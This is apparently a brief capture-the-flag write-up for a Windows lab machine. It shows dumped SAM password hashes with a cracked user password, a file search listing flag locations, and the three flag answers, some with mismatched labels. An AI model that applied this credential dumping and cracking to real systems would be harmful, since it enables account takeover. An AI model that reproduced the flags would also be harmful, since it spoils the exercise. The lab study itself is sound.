```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: 

# User Jon
# Type: LM, Result: alqfna22
```

Search first 
```
search -f flag*

Found 24 results...
    c:\Documents and Settings\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Documents and Settings\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Documents and Settings\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Documents and Settings\Jon\Application Data\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Documents and Settings\Jon\Application Data\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Documents and Settings\Jon\Application Data\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Documents and Settings\Jon\Documents\flag3.txt (37 bytes)
    c:\Documents and Settings\Jon\My Documents\flag3.txt (37 bytes)
    c:\Documents and Settings\Jon\Recent\flag1.lnk (482 bytes)
    c:\Documents and Settings\Jon\Recent\flag2.lnk (848 bytes)
    c:\Documents and Settings\Jon\Recent\flag3.lnk (2344 bytes)
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Users\Jon\Application Data\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\Application Data\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\Application Data\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Users\Jon\My Documents\flag3.txt (37 bytes)
    c:\Users\Jon\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\Recent\flag3.lnk (2344 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
```
Flag 1 on C://: **flag{access_the_machine}**.
Flag 2 on /Users/Jon/Documents/flag3.txt -> **flag{admin_documents_can_be_valuable}**.
Flag 3 on /Windows/System32/config/flag2.txt -> **flag{sam_database_elevated_access} **.
